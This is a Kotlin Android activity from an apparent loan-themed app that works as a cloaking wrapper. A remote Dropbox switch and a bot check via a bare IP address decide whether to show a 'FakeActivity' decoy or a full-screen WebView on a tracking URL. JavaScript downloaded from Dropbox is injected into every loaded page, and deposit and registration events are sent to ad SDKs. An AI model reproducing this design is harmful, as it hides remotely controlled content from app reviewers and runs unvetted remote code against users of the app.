package com.organizationzaim.multiapp

import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.app.ProgressDialog
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.Rect
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkRequest
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.webkit.*
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity
import bolts.AppLinks
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.AppsFlyerLibCore
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.onesignal.OSNotification
import com.onesignal.OneSignal
import com.organizationzaim.multiapp.FakeView.FakeActivity
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*


class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler, FileChooseClient.ActivityChoser {

    private lateinit var okHttpClient: OkHttpClient
    private lateinit var preferences: SharedPreferences
    private lateinit var dialog: AlertDialog
    private lateinit var progressBar: ProgressBar
    private var script : String = ""

    private var goNext = true
    private var isConnected                                   = true
    private lateinit var webView: WebView
    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    private var mCameraPhotoPath: String?                     = null
    private var alertDialog: AlertDialog?                     = null
    private val backDeque: Deque<String> = LinkedList()

    private val handler = Handler(Looper.getMainLooper())
    private val conversionTask = object : Runnable {
        override fun run() {
            GlobalScope.launch {
                val json = getConversion()
                val eventName = "event"
                val valueName = "value"
                if (json.has(eventName)) {
                    val value =
                        json.optString(valueName) ?: " " // при пустом value отправляем пробел
                    sendOnesignalEvent(json.optString(eventName), value)
                    sendFacebookEvent(json.optString(eventName), value)
                    sendAppsflyerEvent(json.optString(eventName), value)
                }
            }
            handler.postDelayed(this, 15000)
        }
    }

    override var uploadMessage: ValueCallback<Array<Uri>>? = null

    companion object {
        private const val TAG = "MainA1ctivi"
        private const val INPUT_FILE_REQUEST_CODE = 1
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        progressBar = findViewById(R.id.progressBar)

        GlobalScope.launch(Dispatchers.Main) {
            val analyticsJs =
                "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //DEBUG!!!
            val scriptTask =
                async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }

            script = scriptTask.await()
        }

        val queue = Volley.newRequestQueue(this@MainActivity)

        val stringRequest = StringRequest(
            com.android.volley.Request.Method.GET,
            "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0",
            { response ->
                if (response.toString() == "true") {
                    progressBar.visibility = ProgressBar.GONE
                    startActivity(Intent(this@MainActivity, FakeActivity::class.java))
                    finish()
                    return@StringRequest

                }
            },
            {progressBar.visibility = ProgressBar.GONE
                startActivity(Intent(this@MainActivity, FakeActivity::class.java))
                finish()
                return@StringRequest})
        queue.add(stringRequest)

//            val switcherUrl = "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0"
//            val switcherTask = async(Dispatchers.IO) { URL(switcherUrl).readText(Charsets.UTF_8) }
//            val switcher = switcherTask.await()
//            Log.d(TAG, "switcher $switcher")
//            if (!switcher.isBlank()) {
//                Log.d(TAG, "text $switcher")
//                if (switcher == "true") {
//                    goNext = false
//
//                }

        FacebookSdk.setApplicationId("293366948652919")


        initOkHttpClient()
        initSDK()

            dialog = AlertDialog.Builder(this).apply {
                setTitle("No Internet Connection")
            setMessage("Turn on the the network")
            setCancelable(false)
            setFinishOnTouchOutside(false)
        }.create()

        if (isConnectedToNetwork()) {
            mainInit() // дальнейшая инициализация
        } else {
            val firstDialog = AlertDialog.Builder(this).apply {
                setTitle("No Internet Connection")
                setMessage("Turn on the the network and try again")
                setPositiveButton("Try Again", null)
                setCancelable(false)
                setFinishOnTouchOutside(false)
            }.create()
            firstDialog.show()
            firstDialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                if (isConnectedToNetwork()) {
                    firstDialog.dismiss()
                    mainInit() // дальнейшая инициализация
                }
            }
        }
        registerNetworkCallback()

    }

//----------------------------------------CHECK-NETWORK-------------------------------------------//
    private fun mainInit()                                                                     {
        preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)
        val strDeque = preferences.getString("PREFS_DEQUE", null)
        strDeque?.let {
            for (elem in strDeque.split(",")) {
                addToDeque(elem)
            }
        }
//        if (backDeque.isNotEmpty()) {
//            initWebView()
//            startWebView(backDeque.first)
//            backDeque.removeFirst()
//        } else {
            Log.d(TAG, "NOTHING")
            preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)

            val deeplink = preferences.getString("PREFS_DEEPLINK", null)

            if (deeplink == null) {
                Log.d(TAG, "deeplink = null")
                getDeeplinkFromFacebook()
            } else {
                // Иначе начинаем обработку диплинка
                Log.d(TAG, "deeplink != null")
                processDeeplinkAndStart(deeplink)
//            }
        }
    }
    private fun isConnectedToNetwork(): Boolean                                                {
        val conn = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
        return conn?.activeNetworkInfo?.isConnected ?: true
    }
    private fun registerNetworkCallback()                                                      {
        try {
            val connectivityManager =
                getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val builder = NetworkRequest.Builder()

            connectivityManager.registerNetworkCallback(builder.build(), object :
                ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    super.onAvailable(network)
                    dialog.hide()
                }

                override fun onLost(network: Network) {
                    super.onLost(network)
                    dialog.show()
                }
            })
        } catch (ex: java.lang.Exception) {
            ex.printStackTrace()
        }
    }


//-------------------------------------OK-HTTP-REQUEST--------------------------------------------//
    private fun initOkHttpClient()                                                             {
        okHttpClient = OkHttpClient.Builder()
            .followSslRedirects(false)
            .followRedirects(false)
            .addNetworkInterceptor {
                it.proceed(
                    it.request().newBuilder()
                        .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                        .build()
                )
            }.build()

    }
    private fun isBot(): Boolean                                                               {
        try {
            val response = okHttpClient
                .newCall(Request.Builder().url("http://78.47.187.129/Z4ZvXH31").build())
                .execute()
            val redirectLocation = response.header("Location")

            redirectLocation?.let { return Uri.parse(it).host == "bot" } ?: return true
        } catch (ex: Exception) {
            return true
        }
    }

//-------------------------------------DEEPLINK---------------------------------------------------//
    private fun getDeeplinkFromFacebook()                                                      {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(applicationContext) { appLinkData ->
            val uri: Uri? = appLinkData?.targetUri ?: AppLinks.getTargetUrlFromInboundIntent(this, intent)

            if (uri != null && uri.query != null) {
                processDeeplinkAndStart(uri.query!!) // передаем параметры диплинка дальше и обрабатываем
                preferences.edit().putString("PREFS_DEEPLINK", uri.query!!).apply()
            } else {
                processDeeplinkAndStart("") // передаем пустую строку в метод обработки диплинка
            }

        }
    }
    private fun processDeeplinkAndStart(deeplink: String)                                      {

        val trackingUrl = "https://wokeup.site/click.php?key=ZvjJ12Wr2oTlGNLQyhV9"

        val clickId = getClickId()
        val sourceId = BuildConfig.APPLICATION_ID
        var finalUrl = "$trackingUrl&source=$sourceId&click_id=$clickId"

        if (!deeplink.isBlank()) {
            finalUrl = "$finalUrl&$deeplink"
        }

        GlobalScope.launch(Dispatchers.Main) {

            val analyticsJs = "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //NOT CORRECTED!!
            val scriptTask = async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }

            script = scriptTask.await()
            Log.d(TAG, "Script$script")

            val isBot = withContext(Dispatchers.IO) { isBot() }

            Log.d(TAG, "IS_BOT$isBot")

            if (backDeque.isNotEmpty()  && backDeque.first != "") {
                initWebView()
                startWebView(backDeque.first)
            } else {
                handler.post(conversionTask)

                OneSignal.sendTag("nobot", "1")
                OneSignal.sendTag("bundle", BuildConfig.APPLICATION_ID)

                val streamId = Uri.parse("?$deeplink").getQueryParameter("stream")

                if (!streamId.isNullOrBlank()) {
                    OneSignal.sendTag("stream", streamId)
                }
                initWebView()
                startWebView(finalUrl)
            }
        }
    }
    private fun getClickId(): String                                                           {
        var clickId = preferences.getString("PREFS_CLICK_ID", null)
        if (clickId == null) {
            // в случае если в хранилище нет click_id, генерируем новый
            clickId = UUID.randomUUID().toString()
            preferences.edit().putString("PREFS_CLICK_ID", clickId)
                .apply() // и сохраняем в хранилище
        }
        return clickId
    }

//----------------------------------------WEBVIEW-------------------------------------------------//
    private fun initWebView()                                                                  {

    toScroll(false)

    val cookieManager = CookieManager.getInstance()
    cookieManager.setAcceptCookie(true)

    window.decorView.viewTreeObserver.addOnGlobalLayoutListener {
        val bit = Rect()
        window.decorView.getWindowVisibleDisplayFrame(bit)

        val osh = window.decorView.rootView.height
        val ka = osh - bit.bottom
        val kart = ka > osh * 0.1399
        toScroll(kart)
    }

    webView = findViewById(R.id.webView)
//    webView.visibility = WebView.GONE

    webView?.scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
    webView?.settings?.loadWithOverviewMode = true
    webView?.settings?.useWideViewPort = true
    webView?.settings?.javaScriptEnabled = true
    webView?.settings?.domStorageEnabled = true
    webView?.settings?.databaseEnabled = true
    webView?.settings?.setSupportZoom(false)
    webView?.settings?.allowFileAccess = true
    webView?.settings?.allowContentAccess = true
    webView?.settings?.loadWithOverviewMode = true
    webView?.settings?.useWideViewPort = true
    webView?.settings?.allowFileAccess = true
    webView?.settings?.domStorageEnabled = true
    webView?.settings?.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
    webView?.settings?.mediaPlaybackRequiresUserGesture = true
}
    private fun startWebView(startUrl:String)                                                  {
        webView?.loadUrl(startUrl)
        Log.d(TAG, "Start $startUrl")
        webView?.setNetworkAvailable(isConnected)

        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.setAcceptThirdPartyCookies(webView, true)
        }

        webView?.webChromeClient = FileChooseClient(this)

        webView?.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                CookieManager.getInstance().flush()
//                        if (progressBar?.isShowing!!) {
//                            progressBar?.dismiss()
//                        }
                url?.let { if (it != "about:blank") addToDeque(it) }
                val queryId = preferences.getString("PREFS_QUERYID", "")
                webView?.evaluateJavascript(script) {
                    webView?.evaluateJavascript("q('$queryId');") {}
                    Log.d(TAG, "load")
                }
            }
            override fun onReceivedError(view: WebView, errorCode: Int, description: String, failingUrl: String) {
                alertDialog?.setTitle("Error")
                alertDialog?.setMessage(description)
                alertDialog?.show()
                if (errorCode == ERROR_TIMEOUT) {
                    view.stopLoading()
                }
            }
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                view.loadUrl(url)
                Uri.parse(url).getQueryParameter("cust_offer_id")
                    ?.let {
                        preferences.edit().putString("PREFS_QUERYID", it).apply()
                    }

                return false
            }
        }
        webView.visibility = WebView.VISIBLE

    }
    private fun toScroll(flag: Boolean)                                                        {
        if (flag){
            window.clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
            window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_VISIBLE
        }else{
            window.setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
            )

            window.decorView.systemUiVisibility = (
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION)
        }
    }
    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean                             {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView!!.canGoBack()) {
            webView!!.goBack()
            return true
        }
        return false
    }
    override fun onBackPressed()                                                               {
        if (!goBackWithDeque()) {
            // Если в очереди нет ссылок, возвращаемся назад по умолчанию
            super.onBackPressed()
        }
    }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?)            {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == FileChooseClient.ActivityChoser.REQUEST_SELECT_FILE) {
            if (uploadMessage == null) return
            uploadMessage?.onReceiveValue(
                WebChromeClient.FileChooserParams.parseResult(
                    resultCode,
                    data
                )
            )
            uploadMessage = null
        }
    }

//-----------------------------------Запоминание-пяти-последних-ссылок----------------------------//
    override fun onStop()                                                                      {
        super.onStop()
        preferences.edit().putString("PREFS_DEQUE", backDeque.reversed().joinToString(",")).apply()
    }
    private fun addToDeque(url: String)                                                        {
        if (backDeque.size > 5) {
            backDeque.removeLast()
        }
        backDeque.addFirst(url)
    }
    private fun goBackWithDeque(): Boolean                                                     {
        try {
            if (backDeque.size == 1) return false;

            // Удаляем текущую ссылку
            backDeque.removeFirst()
            webView?.loadUrl(backDeque.first)

            // Удаляем предыдущую ссылку, т.к. она повторно добавится в onPageFinished
            backDeque.removeFirst()
            return true

        } catch (ex: NoSuchElementException) {
            ex.printStackTrace()
            return false
        }
    }

//-------------------------------------EVENTS-TO-SDK----------------------------------------------//
    private fun getConversion(): JSONObject                                                    {
        val conversionUrl = "https://freerun.site/conversion.php"
        return try {
            val response = okHttpClient // Делаем запрос, добавив к ссылке click_id
                .newCall(Request.Builder().url("$conversionUrl?click_id=${getClickId()}").build())
                .execute()
            JSONObject(response.body()?.string() ?: "{}")
        } catch (ex: Exception) {
            JSONObject("{}")
        }
    }
    private fun sendOnesignalEvent(key: String, value: String)                                 {
        OneSignal.sendTag(key, value)
    }
    private fun sendFacebookEvent(key: String, value: String)                                  {
        val fb = AppEventsLogger.newLogger(this)

        val bundle = Bundle()
        when (key) {
            "reg" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                fb.logEvent(AppEventsConstants.EVENT_NAME_COMPLETED_REGISTRATION, bundle)
            }
            "dep" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                fb.logEvent(AppEventsConstants.EVENT_NAME_ADDED_TO_CART, bundle)
            }
        }
    }
    private fun sendAppsflyerEvent(key: String, value: String)                                 {
        val values = HashMap<String, Any>()
        values[key] = value
        AppsFlyerLib.getInstance().trackEvent(this, key, values)
    }
    private fun initSDK()                                                                      {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        OneSignal.startInit(this)
            .setNotificationReceivedHandler(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()

        val devKey = "qrdZGj123456789"; // ЗДЕСЬ ДОЛЖЕН БЫТЬ ВАШ КЛЮЧ, ПОЛУЧЕННЫЙ ИЗ APPSFLYER !!!
        val conversionDataListener  = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                data?.let { cvData ->
                    cvData.map {
                        Log.i(AppsFlyerLibCore.LOG_TAG, "conversion_attribute:  ${it.key} = ${it.value}")
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                Log.e(AppsFlyerLibCore.LOG_TAG, "error onAttributionFailure :  $error")
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                data?.map {
                    Log.d(AppsFlyerLibCore.LOG_TAG, "onAppOpen_attribute: ${it.key} = ${it.value}")
                }
            }

            override fun onAttributionFailure(error: String?) {
                Log.e(AppsFlyerLibCore.LOG_TAG, "error onAttributionFailure :  $error")
            }
        }

        AppsFlyerLib.getInstance().init(devKey, conversionDataListener, this)
        AppsFlyerLib.getInstance().startTracking(this)
    }
    override fun notificationReceived(notification: OSNotification) {
        val keys = notification.payload.additionalData.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            try {
                OneSignal.sendTag(key, notification.payload.additionalData.get(key).toString())
            } catch (e: JSONException) {
                e.printStackTrace()
            }
        }
    }
}
